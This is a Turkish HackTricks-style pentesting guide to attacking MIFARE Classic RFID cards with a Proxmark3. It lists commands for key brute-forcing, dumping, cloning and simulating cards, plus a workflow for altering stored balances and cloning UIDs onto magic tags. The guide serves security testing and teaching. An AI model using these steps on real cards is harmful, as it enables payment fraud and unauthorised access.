# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 ile RFID Sistemlerine Saldırma

Yapmanız gereken ilk şey bir [**Proxmark3**](https://proxmark.com) edinmek ve [**yazılımı ve bağımlılık**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**larını yüklemektir**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB'ye Saldırma

**16 sektöre** sahiptir; bunların her biri **4 bloktan** oluşur ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
Her sektöre erişmek için, her sektörün **3. bloğunda** (sektör trailer'ı) depolanan **2 anahtara** (**A** ve **B**) ihtiyaç duyarsınız. Sektör trailer'ı ayrıca, 2 anahtarı kullanarak **her blok için okuma ve yazma** izinlerini belirleyen **access bits** değerlerini de depolar.\
Örneğin, ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izinleri vermek için 2 anahtar kullanışlıdır.

Birkaç saldırı gerçekleştirilebilir<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3, hassas verileri bulmaya çalışmak için **Tag to Reader communication** üzerinde **eavesdropping** gibi başka işlemler gerçekleştirmeye olanak tanır. Bu kartta, kullanılan **cryptographic operations weak** olduğu ve plain ile cipher text'i bilerek kullanılan anahtarı (`mfkey64` tool'u) hesaplayabildiğiniz için iletişimi dinleyip kullanılan anahtarı hesaplayabilirsiniz.<sup>[[3]](#references)</sup>

#### MiFare Classic'te stored-value abuse için hızlı iş akışı

Terminaller bakiyeleri Classic kartlarda depoladığında, tipik uçtan uca akış şöyledir:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notlar

- `hf mf autopwn`, nested/darkside/HardNested-style attacks'leri yönetir, anahtarları kurtarır ve client dumps klasöründe dump'lar oluşturur.
- Block 0/UID yazma işlemi yalnızca magic gen1a/gen2 cards üzerinde çalışır. Normal Classic cards salt okunur UID'ye sahiptir.<sup>[[2]](#references)</sup>
- Birçok deployment, Classic "value blocks" veya basit checksum'lar kullanır. Düzenleme sonrasında tüm yinelenen/tamamlayıcı alanların ve checksum'ların tutarlı olduğundan emin olun.

Daha üst düzey bir methodology ve mitigations için bkz.:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Komutlar

IoT systems bazen **nonbranded veya noncommercial tags** kullanır. Bu durumda Proxmark3'ü kullanarak **tags'e özel raw komutlar** gönderebilirsiniz.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart ve onunla nasıl iletişim kurulacağı hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 şu tür raw komutları göndermenize olanak tanır: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **automation scripts** listesiyle birlikte gelir. Listenin tamamını almak için `script list` komutunu kullanın. Ardından `script run` komutunu ve script’in adını kullanın:
```
proxmark3> script run mfkeys
```
**valid card** verilerini kopyaladıktan sonra, bir veya daha fazla rastgele **byte**'ı **randomize** eden bir **Lua script** yazarak ve her iterasyonda **reader**'ın çöküp çökmediğini kontrol ederek **tag reader**'larını **fuzz** etmek için bir script oluşturabilirsiniz.

## Referanslar

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
